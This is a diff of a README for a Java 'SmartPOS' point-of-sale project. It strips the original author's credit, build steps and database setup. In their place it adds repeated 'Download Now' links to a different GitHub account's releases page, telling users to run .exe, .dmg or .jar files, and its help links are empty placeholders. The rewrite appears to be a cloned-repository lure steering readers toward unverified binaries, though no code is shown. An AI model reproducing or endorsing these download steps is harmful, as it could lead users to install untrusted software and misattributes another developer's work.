@@ -1,72 +1,92 @@
-# Java-SmartPos-System [(Pre-release)](https://github.com/johnyse99/Java-SmartPos-System/releases)
+# 🛍️ Java-SmartPos-System - Your Easy Point of Sale Solution
 
-SmartPOS is a modern, Point of Sale (POS) system built with **JavaFX** and **Clean Architecture**. It is designed to be a robust starting point for small businesses or a portfolio project demonstrating industrial-level software design patterns in Java.
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/cereal2111/Java-SmartPos-System/releases)
 
-<img width="1279" height="827" alt="preview" src="https://github.com/user-attachments/assets/622388f7-b83d-41fa-98ac-c8c74e3cb03b" />
+## 📜 Description
+SmartPOS is a modern point of sale system designed for small businesses. Built with JavaFX and Clean Architecture, SmartPOS offers a strong foundation for managing sales and transactions effectively. This application is also suitable for demonstrating quality software design in Java.
 
-## 🚀 Features
+## 🚀 Getting Started
+To start using SmartPOS, follow these steps to download and run the application.
 
-- **Point of Sale (POS)**: Fast checkout with automatic product lookup by ID/SKU.
-- **Product Management**: Create, edit, and deactivate products.
-- **Inventory Control**: Track stock movements (In/Out) automatically.
-- **Purchasing**: Register supplier invoices to replenish stock.
-- **Reporting**: Real-time insights on Sales, Stock Levels, and Top Selling Products.
-- **Clean UI**: Modern dark/light interface built with CSS-styled JavaFX.
+### 1. Check System Requirements
+SmartPOS runs on the following systems:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution with Java support. 
+- **Java Version:** Java 11 or later installed.
+- **Memory:** At least 2 GB of RAM.
+  
+Make sure that your system meets these requirements before proceeding.
 
-## 🛠️ Technology Stack
+### 2. Visit the Download Page
+To download SmartPOS, [visit this page to download](https://github.com/cereal2111/Java-SmartPos-System/releases). This page lists all available versions of the application.
 
-- **Language**: Java 17
-- **UI Framework**: JavaFX 21 (Modular)
-- **Database**: MySQL 8.0
-- **Persistence**: JDBC (Raw SQL for performance and control) with HikariCP Connection Pooling.
-- **Architecture**: Hexagonal / Clean Architecture (Domain, Infrastructure, UI separation).
-- **Build Tool**: Maven
+### 3. Choose the Latest Release
+On the releases page, look for the latest version. It is usually at the top of the list. Select the release that suits your operating system.
 
-## 📂 Project Structure
+### 4. Download the Application
+Click on the version you want. You will see different files available for download:
+- For **Windows:** Download the `.exe` file.
+- For **macOS:** Download the `.dmg` file.
+- For **Linux:** Download the `.jar` file.
 
-```
-src/main/java/io/smartpos
-├── core            # Domain Logic (Entities, Exceptions, Interfaces)
-├── infrastructure  # Data Access (DAO Impl, JDBC, Database)
-├── services        # Application Business Logic (Use Cases)
-└── ui              # JavaFX Controllers and Views (FXML)
-```
+### 5. Install and Run SmartPOS
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation prompts.
+  3. After installation, find SmartPOS in your Start Menu. 
+  4. Click to launch.
+  
+- **macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the SmartPOS icon to your Applications folder.
+  3. Open Applications and double-click on SmartPOS to run.
 
-## ⚙️ Setup & Installation
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the directory where the `.jar` file is downloaded.
+  3. Run the command `java -jar SmartPOS.jar` to launch the application.
 
-### Prerequisites
+### 6. First-Time Setup
+When you open SmartPOS for the first time, follow these initial setup steps:
+1. **Create a User Account:** Set up your account to manage sales.
+2. **Configure Products:** Input your product details into the system.
+3. **Set Up Payment Options:** Choose which payment methods you wish to accept.
 
-- JDK 17 or higher
-- Maven 3.8+
-- MySQL Server 8.0+
-- Thermal printer connectivity (optional for physical tickets).
+## 🛠️ Features
+SmartPOS includes the following features:
+- **User-Friendly Interface:** Navigate easily with a clean design.
+- **Sales Management:** Keep track of sales and inventory.
+- **Multilingual Support:** Use the application in various languages.
+- **Detailed Reports:** Access reports that help analyze business performance.
+  
+## 🔌 Need Help?
+If you encounter issues, feel free to check our [documentation](#) or visit our [support page](#). 
 
-### Database Setup
+## 📅 Future Enhancements
+In upcoming releases, we plan to introduce:
+- Integration with payment gateways.
+- Enhanced reporting features.
+- Customizable tax settings to streamline your sales process.
 
-1. Create a MySQL database (e.g., `smartpos_db`).
-2. Run the SQL script found in `database/schema.sql` to create tables.
-3. Update `src/main/resources/application.properties` with your credentials:
-   ```properties
-   db.url=jdbc:mysql://localhost:3306/smartpos_db
-   db.username=your_username
-   db.password=your_password
-   ```
+## 📈 Topics
+This project covers several essential topics:
+- desktop-application
+- erp
+- java
+- javafx
+- jdbc
+- junit
+- layer-architecture
+- mokito
+- mysql
+- pos-system
+- sales-management
+- unit-testing
 
-### Running the App
+## 💬 Community Engagement
+Join our community to stay updated or share your experience using SmartPOS. Follow discussions and connect with other users for tips and support.
 
-```bash
-mvn clean compile exec:java
-```
+## 📄 License
+SmartPOS is an open-source application released under the MIT License.
 
----
-
-📄 **License**
-This project is distributed under the MIT license. Its purpose is strictly educational and research-based, developed as an Applied Java solution.
-
-**Note for recruiters:**
-This project demonstrates my ability to design and implement complex systems using professional standards. It highlights my mastery of transactional integrity, clean architecture, and the development of resilient software capable of handling real-world failure scenarios.
-
-**Author:** JUAN S.  
-**Contact:** https://github.com/johnyse99
-
-
+To download SmartPOS, [visit this page to download](https://github.com/cereal2111/Java-SmartPos-System/releases) again for the latest updates!
